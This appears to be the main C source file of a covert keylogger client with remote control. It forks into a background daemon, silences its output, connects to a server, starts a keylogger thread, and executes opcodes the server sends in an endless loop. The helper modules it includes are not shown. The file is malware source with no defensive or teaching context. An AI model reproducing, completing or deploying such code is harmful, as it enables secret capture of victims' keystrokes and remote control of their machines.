#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include "keylog.h" 
#include "constraints.h"
#include "messageManager.h"
#include "clientManager.h"
#include "utils.h"

clientInfo_t clientData;

int main()
{
    pid_t pid, sid;

    pid = fork();

    if (pid < 0)
    {
        
        perror("Fork failed");
        exit(1);
    }

    if (pid > 0)
    {
        printf("Parent process exiting, child will be adopted by init\n");
        exit(0);
    }

    sid = setsid();
    if (sid < 0)
    {
        perror("Failed to create a new session");
        exit(1);
    }

    if (chdir("/") < 0)
    {
        perror("Failed to change working directory to /");
        exit(1);
    }

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_WRONLY);

    printf("This process is now detached and running as a daemon.\n");

    int sock;
    connectionInitialize(&sock);
    clientData.serverSocket = sock;
    startingDataInitialize();

    clientData.isKeyLoggerActive = 1;

    if (pthread_create(&clientData.keyLoggerTid, NULL, start_keylogger, NULL) < 0)
    {
        clientData.isKeyLoggerActive = 0;

        perror("Could not create thread");
    }
    pthread_detach(clientData.keyLoggerTid);

    message_t msg;
    // msg.opCode = 'S';
    // msg.size = 0;
    // handleOpcode(msg);
    // while (1)
    // {
    //     sleep(1);
    //     msg.opCode = 'S';
    //     msg.size = 0;
    //     handleOpcode(msg);
    // }
    while (1)
    {
        if (recvMessage(sock, &msg) <= 0)
            break;
        // printf("Recieved: %s(opcode %c)", msg.buffer, msg.opCode);
        handleOpcode(msg);
    }
    
    close(sock);

    return 0;
}